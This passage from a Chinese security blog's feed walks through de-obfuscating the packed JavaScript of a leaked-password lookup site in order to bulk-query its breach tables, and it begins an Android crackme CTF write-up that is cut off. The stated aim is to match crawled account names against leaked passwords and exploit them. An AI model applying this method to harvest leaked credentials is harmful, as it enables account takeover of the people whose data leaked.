&apos;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||_|somd5comf78518fb1|||||||||||somd5com21a288587|return|somd5com6d38bb14b|somd5com3de2f8f6d|function|somd5comd152c7b41|somd5comf3298c8c5|if|String|new|replace|somd5com8f18e7d16|while|eval|var|u7d22|somd5com16af76eea|somd5com6cd7bc889|somd5comed2bd7eb6|css|somd5comb9e3341a3|u5bb9|match_act|somd5com4d38b6944|select_act|u5185|u6ca1|false|get_del|u91cf|u6709|u6761|ajax|somd5come0b7918e1|somd5com4823e252c|u5ea6|get_jdt|display|somd5com811fa93b4|block|ajax_post|get_data|Date|value_tables|addRow|getTime|somd5com25f9df3a7|get_okcount|somd5com6d6674984|somd5comf49be7e59|u641c|key||somd5com9a3a7ef82|u5173|somd5_table|somd5com326e7999e|u6bd5|val|alert|somd5com956a89722|u8017|u65f6|somd5comd7f929c0a|somd5comf1d14de2e|u952e|u5b57|u79d2|u6beb|rows|somd5comf46beb405|somd5com738c8372f|somd5com3b1df0e8d|somd5comdcaedb43e|else|somd5com36f2c91c7|Math|u5230|u8bf7|u5b8c|u6570|getElementById|document|decimal|somd5com5b49d9f12|database|u636e|somd5comdd52905dc|pow|u8be2|for|somd5comb39f98f6a|round|empty|insertRow|gat_kong|focus|somd5comf53e662dd|indexOf|success|insertCell|somd5comea98952b0|progress|dataxxxx|length|SOMD5|somd5comb93c3a502|100|搜MD5|split|62|184|RegExp|fromCharCode|somd5com4af3e5365|parseInt|selecting|u67e5|somd5com490d63bb2|toString|somd5comf94f3be31|data|u5728|u6b63|u8f93|select|u8fdb|u5165|u603b|POST|act|来打我啊|SOMD55|somd5comeff53bcd1|tbody|php|table|傻逼|你TM的来打我啊|getdata|stend|u5927|innerHTML|url|type|somd5combdba21b9c|Administry|u4e8e4|u7684|操你妈|u60a8|u627e|u90ae|u957f|u5462|u7bb1&apos;.split(&apos;|&apos;), 0, &#123;&#125;));</div></pre></td></tr></table></figure> <p>不过直接看也挺闹人的，边调试边看吧。</p> <p>参数是什么？</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// p是字符串</div><div class="line">// a 是62</div><div class="line">// c 是 352数组大小， k 是Array[352]</div><div class="line">// e 是0 ， d 是&#123;&#125;</div></pre></td></tr></table></figure> <p>e函数干嘛了？具体返回数据暂时也不同看了，调试到了自然可以dump出来</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">e = function(c) &#123;</div><div class="line">  //61以内的就返回字符，0-9,a-z(11-36),A-Z(36-61)</div><div class="line">  //62以上</div><div class="line">  //c.toString(36) 36进制转为字符</div><div class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>然后就解密那一长串字符了，用的e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while (c--)</div><div class="line">            d[e(c)] = k[c] || e(c);</div></pre></td></tr></table></figure></p> <p>解出来的数据大概是这样的一个object，</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">5y: &apos;u7684&apos;</div><div class="line">5x: &apos;u4e8e4&apos;</div><div class="line">5w: &apos;Administry&apos;</div><div class="line">5v: &apos;somd5combdba21b9c&apos;</div><div class="line">5u: &apos;type&apos;</div><div class="line">5t: &apos;url&apos;</div><div class="line">5s: &apos;innerHTML&apos;</div><div class="line">5r: &apos;u5927&apos;</div><div class="line">5q: &apos;stend&apos;</div><div class="line">5p: &apos;getdata&apos;</div><div class="line">5o: &apos;你TM的来打我啊&apos;</div><div class="line">5n: &apos;傻逼&apos;</div><div class="line">5m: &apos;table&apos;</div><div class="line">5l: &apos;php&apos;</div><div class="line">5k: &apos;tbody&apos;</div><div class="line">5j: &apos;somd5comeff53bcd1&apos;</div></pre></td></tr></table></figure> <p>然后继续解，将结果返回给eval执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">while (c--)</div><div class="line">        if (k[c])</div><div class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</div></pre></td></tr></table></figure> <p>直接dump结果，如下</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">var _$ = [&quot;&quot;, &apos;&apos;, &apos;\\w+&apos;, &apos;\\b&apos;, &apos;\\b&apos;, &apos;g&apos;, &apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\2h\\2g\\k\\p&quot;,&quot; \\2i\\2k\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O!\\1q\\1t\\1j\\1k\\1g\\G\\D\\E\\U\\W \\z\\A: &quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,\&apos;2j\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\&apos;1O.2b?2d=2f\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\&apos;\&apos;,&quot;#I&quot;,&quot;\\Z\\2e\\2l\\k\\p\\1r\\1n/\\G\\D\\E/\\2s\\2r&quot;,&quot;\\G\\D\\E\\2t\\1N\\Z\\2v\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\1q\\1t\\2n\\1g\\2m\\1j\\1k\\2o\\1r\\1n\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;&apos;, &apos;||||||||||搜MD5|SOMD5|_|var|function|length|100|somd5comb93c3a502|if|somd5com490d63bb2|u67e5|somd5comf94f3be31|somd5com4af3e5365|selecting|somd5comdd52905dc|u8be2|insertCell|progress|somd5comf53e662dd|Administry|somd5combdba21b9c|stend|innerHTML|somd5comd7f929c0a|somd5comf1d14de2e|u8017|u65f6|u79d2|u6beb|u952e|u5b57|somd5com956a89722|u5173|somd5_table|key|somd5com9a3a7ef82|val|alert|somd5comd152c7b41|somd5com326e7999e|u6bd5|rows|getElementById|document|return|u5b8c|u6570|database|u636e|decimal|somd5com5b49d9f12|u8bf7|||||||||||somd5com3b1df0e8d|somd5comdcaedb43e|somd5comf78518fb1|somd5comf46beb405|somd5com738c8372f|Math|u5230|else|somd5com36f2c91c7|u641c|u7d22|somd5com3de2f8f6d|somd5comb9e3341a3|u5bb9|match_act|select_act|u6ca1|u5185|somd5com4d38b6944|u6709|u6761|u91cf|false|get_del|somd5comed2bd7eb6|css|somd5com6cd7bc889|somd5com16af76eea|value_tables|addRow|get_data|new|Date|getTime|somd5com6d6674984|somd5comf49be7e59|somd5com25f9df3a7|get_okcount|somd5com4823e252c|u5ea6|ajax|somd5come0b7918e1|get_jdt|block|ajax_post|display|somd5com811fa93b4|somd5comeff53bcd1|tbody|来打我啊|SOMD55|傻逼|||||||||||你TM的来打我啊|php|table|act|u8f93|select|u5728|u6b63|u603b|POST|u8fdb|u5165|u60a8|u627e|u7684|操你妈|u5462|u7bb1|u90ae|u957f|u4e8e4|u5927|30|getdata|31|33|32|eval|url|type|data|indexOf|success|focus|39|38|dataxxxx|40|somd5comea98952b0|gat_kong|35|34|36|for|37|pow|empty|insertRow|somd5comb39f98f6a|round&apos;, &apos;|&apos;];</div><div class="line">eval(function(somd5comf3298c8c5, somd5com3de2f8f6d, somd5comf78518fb1, somd5com6d38bb14b, e, somd5comd152c7b41) &#123;</div><div class="line"> //</div><div class="line">    e = function(somd5com21a288587) &#123;</div><div class="line">        return (somd5com21a288587 &lt; somd5com3de2f8f6d ? _$[0] : e(parseInt(somd5com21a288587 / somd5com3de2f8f6d))) + ((somd5com21a288587 = somd5com21a288587 % somd5com3de2f8f6d) &gt; 35 ? String[&quot;fromCharCode&quot;](somd5com21a288587 + 29) : somd5com21a288587[&quot;toString&quot;](36))</div><div class="line">    &#125;</div><div class="line">    ;</div><div class="line">    if (!_$[1][&quot;replace&quot;](/^/, String)) &#123;</div><div class="line">        while (somd5comf78518fb1--)</div><div class="line">            somd5comd152c7b41[e(somd5comf78518fb1)] = somd5com6d38bb14b[somd5comf78518fb1] || e(somd5comf78518fb1);</div><div class="line">        somd5com6d38bb14b = [function(somd5com8f18e7d16) &#123;</div><div class="line">            return somd5comd152c7b41[somd5com8f18e7d16]</div><div class="line">        &#125;</div><div class="line">        ];</div><div class="line">        e = function() &#123;</div><div class="line">            return _$[2]</div><div class="line">        &#125;</div><div class="line">        ;</div><div class="line">        somd5comf78518fb1 = 1</div><div class="line">    &#125;</div><div class="line">    ;while (somd5comf78518fb1--)</div><div class="line">        if (somd5com6d38bb14b[somd5comf78518fb1])</div><div class="line">            somd5comf3298c8c5 = somd5comf3298c8c5[&quot;replace&quot;](new RegExp(_$[3] + e(somd5comf78518fb1) + _$[4],_$[5]), somd5com6d38bb14b[somd5comf78518fb1]);</div><div class="line">    return somd5comf3298c8c5</div><div class="line">&#125;(_$[6], 62, 184, _$[7][&quot;split&quot;](_$[8]), 0, &#123;&#125;))</div></pre></td></tr></table></figure> <p>有没有感觉很熟悉的结果，就是上面解密的哪个函数，参数变量真tmd<br>好看。不详细说了，跟前一次一样，最后返回一个解密的js代码，给eval执行。</p> <p>这次dump出来看到了要的东西了！注释都有了，就不说了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function getdata() &#123;</div><div class="line">    $(_$[28])[&quot;css&quot;](_$[29], _$[30]);</div><div class="line">    get_del();</div><div class="line">    var somd5com490d63bb2 = $(_$[31])[&quot;val&quot;]();//输入</div><div class="line">    if (somd5com490d63bb2 == _$[32]) &#123;</div><div class="line">        $(_$[33])[&quot;focus&quot;]();</div><div class="line">        alert(_$[34]);</div><div class="line">        return false</div><div class="line">    &#125;</div><div class="line">    ;if (somd5com490d63bb2[&quot;length&quot;] &lt; 4) &#123;</div><div class="line">        alert(_$[35]); //&quot;关键字长度请大于4!!&quot;</div><div class="line">        return false</div><div class="line">    &#125;</div><div class="line">    ;var somd5combdba21b9c = $(_$[36])[&quot;val&quot;](); //选择的搜索类型，1，2,3</div><div class="line">    var somd5comd7f929c0a = $(_$[37])[&quot;val&quot;](); //匹配类型，1模糊,2精确</div><div class="line">    somd5com326e7999e = new Date()[&quot;getTime&quot;](); //时间戳</div><div class="line">    somd5comdd52905dc = 0;</div><div class="line">    for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</div><div class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>诶，忘了一件事，我们是找table的，在哪里呢？！</p> <p>其实就是上面代码中的database了，这里循环每个table通过get_data(内部ajax访问)来搜索结果。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for (var somd5comb93c3a502 = 0; somd5comb93c3a502 &lt; database[&quot;length&quot;]; somd5comb93c3a502++) &#123;</div><div class="line">        get_data(somd5com490d63bb2, somd5combdba21b9c, somd5comd7f929c0a, database, somd5comb93c3a502)</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>在dump出来的js代码中一搜，database没有找到定义，我靠！什么情况！调试到getdata时，确实是有值的，dump内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,</div><div class="line">&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,</div><div class="line">...] //一部分</div></pre></td></tr></table></figure> <p>但是我能就这么算了吗？！database究竟哪里来的，真想只有一个，去html再看一眼，搜到如下内容，嗯，看来是了，服务器返回的database。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;./ajax.php?act=database&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure> <p>访问<code>http://cha.hxsec.com/ajax.php?act=database</code>，拿到返回的结果</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var database = new Array(&quot;06_cn_mumayi_jd_com&quot;,&quot;1010wan_beihaiw_duowan&quot;,&quot;12306_cn&quot;,&quot;131_xiu_tianya&quot;,&quot;17173_com&quot;,&quot;212300_cxhr_zhaopin_com&quot;,&quot;212300_cxhr_zhaopin_copy&quot;,&quot;24buy_cd&quot;,&quot;51cto_com_new&quot;,&quot;51job_com&quot;,&quot;52pk_com&quot;,&quot;55_la&quot;,&quot;766_tuan800_wanmei_37&quot;,&quot;7k7k_com&quot;,&quot;admin5_apphan_07073_soyun&quot;,&quot;aipai_com&quot;,&quot;all_hack_website&quot;,&quot;av_creditcard_com_cn&quot;,&quot;ccidnet_lashou_com&quot;,&quot;cnnb_mop_qinbao_jiapin_qd315&quot;,&quot;cnzz_com&quot;,&quot;co188_com&quot;,&quot;csdn_net&quot;,&quot;damai_cn&quot;,&quot;dangdang_com&quot;,&quot;dodonew_com&quot;,&quot;gfan_com&quot;,&quot;hiapk_com&quot;,&quot;houdao_com&quot;,&quot;ipart_cn&quot;,&quot;jxjatv_073yx_moko_treo8_paojiao&quot;,&quot;jxrsrc_zhenai&quot;,&quot;kaixin001_com-ispeak_com&quot;,&quot;mail_126_com&quot;,&quot;mail_163_com&quot;,&quot;mail_qq_sina&quot;,&quot;mail_qq_sohu&quot;,&quot;pconline_com_cn&quot;,&quot;pingan_com&quot;,&quot;qiannao_dedecms_baofeng&quot;,&quot;qq_old_password&quot;,&quot;radius-qingdaonews_com&quot;,&quot;renren_com&quot;,&quot;seowhy_shooter-tatazu_book118_cs&quot;,&quot;sorry_unknown&quot;,&quot;sorry_unknown2&quot;,&quot;tgbus_com&quot;,&quot;tpy100_com-jia_com&quot;,&quot;uuu9_com&quot;,&quot;weibo_com&quot;,&quot;xda_comicdd_game&quot;,&quot;xiaohua_other&quot;,&quot;xiaomi_com&quot;);</div></pre></td></tr></table></figure> <p>也知道前面的database变量怎么来的了，为了database有效，<code>ajax.php?act=database</code>是在system.js加载完之后发送的请求。</p> <h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>ok，分析告一段落，table拿到了，接口所有信息都弄清楚了，下面就是开始码代码了！</p> <p>另外，我只想对写system.js的同志说，nmmmp！那一段中文啥用没有，只能激起fn！</p> <p>有不敬之处，敬请见谅！</p> <p>有一点小小的分析技巧：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//猜猜怎么看！</div></pre></td></tr></table></figure> <div style="display:none;"><br><br>这种eval(x)如何分析呢？这里分享一个技巧<br>调试中，得到x之后，如果继续f10，那肯定就飞了，还要继续分析的，怎么办呢？<br><br>使用下面的方法：<br>x = “debugger;\r\n” + x;<br><br>然后f10就会在debugger断下来，然后就跟普通的js分析一样了<br><br>感谢chrome强大的工具！<br><br>希望这点没让大家失望！<br><br></div>  <p>代码地址，有需要请移步：<br><a href="https://github.com/anhkgg/hxsec_search" target="_blank" rel="external">https://github.com/anhkgg/hxsec_search</a></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze">https://anhkgg.github.io/hxsec-search-pwd-interface-analyze</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;0x00-开始&quot;&gt;&lt;a href=&quot;#0x00-开始&quot; class=&quot;headerlink&quot; title=&quot;0x00 开始&quot;&gt;&lt;/a&gt;0x00 开始&lt;/h1&gt;&lt;p&gt;最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…&lt;/p&gt; &lt;p&gt;在 &lt;a href=&quot;https://www.sec-wiki.com/topic/12&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sec-wiki&lt;/a&gt; 找到了&lt;a href=&quot;http://cha.hxsec.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个密码泄露查询网站&lt;/a&gt;。&lt;/p&gt; &lt;p&gt;随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。&lt;/p&gt; &lt;p&gt;but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。&lt;/p&gt; &lt;p&gt;分析一下hxsec的查询接口，用python批量一下。&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="cha.hxsec.com" scheme="https://anhkgg.github.io/tags/cha-hxsec-com/"/>            <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="requests" scheme="https://anhkgg.github.io/tags/requests/"/>            <category term="password" scheme="https://anhkgg.github.io/tags/password/"/>            <category term="密码泄漏" scheme="https://anhkgg.github.io/tags/%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F/"/>            <category term="华西安全网" scheme="https://anhkgg.github.io/tags/%E5%8D%8E%E8%A5%BF%E5%AE%89%E5%85%A8%E7%BD%91/"/>        </entry>      <entry>     <title>看雪CTF2017第六题 Ericky-apk writeup</title>     <link href="https://anhkgg.github.io/kxctf2017-writeup6/"/>     <id>https://anhkgg.github.io/kxctf2017-writeup6/</id>     <published>2017-06-13T08:37:12.000Z</published>     <updated>2017-06-17T08:49:05.649Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>题目入口：<a href="http://ctf.pediy.com/game-fight-36.htm" target="_blank" rel="external">http://ctf.pediy.com/game-fight-36.htm</a></p> <p>本题是安卓cm，目测肯定需要调试so。</p> <p>准备工具：</p> <ol> <li>ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）</li> <li>IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6</li> <li>adb(ApkIde改之理就有)</li> </ol> <a id="more"></a> <h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>将6-Ericky kanxue.apk拖进ApkIDE改之理，等待编译（没有加壳），ok。</p> <p>在右侧树结构栏中，找到smali-&gt;android-&gt;com-&gt;miss-&gt;rfchen，列表中就是java层的主要函数。</p> <p>点击MainActivity.smali，然后点击工具栏中jd-gui.exe，抓到java源码查看。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">public class MainActivity extends Activity</div><div class="line">&#123;</div><div class="line">  private EditText ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = null;</div><div class="line">  private Button ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = null;</div><div class="line"></div><div class="line">  protected void onCreate(Bundle paramBundle)</div><div class="line">  &#123;</div><div class="line">    super.onCreate(paramBundle);</div><div class="line">    setContentView(2130968603);</div><div class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ = ((Button)findViewById(2131427415));</div><div class="line">    this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ = ((EditText)findViewById(2131427416));</div><div class="line">    this.ﹶˊﹶˊﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶﹶˊﹶﹶﹶˊﹶˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶﹶˊˊˊˊˊˊﹶˊˊﹶﹶﹶˊˊﹶﹶˊˊﹶﹶˊˊˊﹶˊﹶˊﹶˊﹶﹶˊﹶﹶˊˊˊﹶﹶˊﹶﹶﹶﹶˊﹶﹶˊˊﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶˊˊﹶﹶﹶﹶˊˊˊˊˊﹶﹶˊˊﹶˊﹶ.setOnClickListener(new View.OnClickListener()</div><div class="line">    &#123;</div><div class="line">      public void onClick(View paramView)</div><div class="line">      &#123;</div><div class="line">        MainActivity.this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  public void 